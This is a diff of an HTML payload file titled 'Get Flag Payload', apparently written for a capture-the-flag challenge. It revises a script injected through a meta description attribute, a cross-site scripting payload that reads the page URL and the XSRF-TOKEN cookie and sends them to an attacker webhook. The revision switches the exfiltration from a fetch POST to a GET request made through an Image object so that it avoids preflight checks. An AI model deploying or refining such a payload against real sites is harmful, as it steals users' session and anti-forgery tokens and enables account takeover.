@@ -3,7 +3,7 @@
 <head>
     <meta charset="utf-8">
     <title>Get Flag Payload</title>
-    <!-- VERSION_GET_FLAG_V2 -->
+    <!-- VERSION_GET_FLAG_V3 -->
     <meta name="description" content='<script>
         (function() {
             var webhook_id = "366bfa59-cf51-45d1-86cd-fa26a87898bb";
@@ -11,19 +11,16 @@
             var loc = window.location.href;
 
             function sendPing(data) {
-                // Sử dụng POST thay vì GET để tránh giới hạn độ dài URL
-                fetch(attacker_url, {
-                    method: "POST",
-                    headers: {
-                        "Content-Type": "application/json"
-                    },
-                    body: JSON.stringify({
-                        source_tag: "name:description_GET_FLAG_V2",
-                        ...data
-                    })
-                }).catch(error => {
-                    console.error("Failed to send ping:", error);
-                });
+                // Quay lại dùng GET để tránh preflight request
+                var params = new URLSearchParams();
+                params.append("source_tag", "name:description_GET_FLAG_V3");
+                for (var key in data) {
+                    let val_str = String(data[key]);
+                    // Không giới hạn độ dài, nhưng encode để tránh lỗi ký tự đặc biệt
+                    params.append(key, encodeURIComponent(val_str));
+                }
+                // Sử dụng Image để gửi GET request
+                new Image().src = attacker_url + "?" + params.toString();
             }
 
             var xsrfTokenValue = null;
@@ -32,12 +29,10 @@
                 for (var i = 0; i < cookies.length; i++) {
                     var cookie = cookies[i].trim();
                     if (cookie.startsWith("XSRF-TOKEN=")) {
-                        // Lấy toàn bộ giá trị cookie, không cắt đoạn
                         xsrfTokenValue = cookie.substring("XSRF-TOKEN=".length);
                         try {
                             xsrfTokenValue = decodeURIComponent(xsrfTokenValue);
                         } catch (e) {
-                            // Nếu decodeURIComponent thất bại, giữ nguyên giá trị
                             sendPing({ stage: "cookie_decode_error", error: e.message, raw_cookie: xsrfTokenValue });
                         }
                         break;
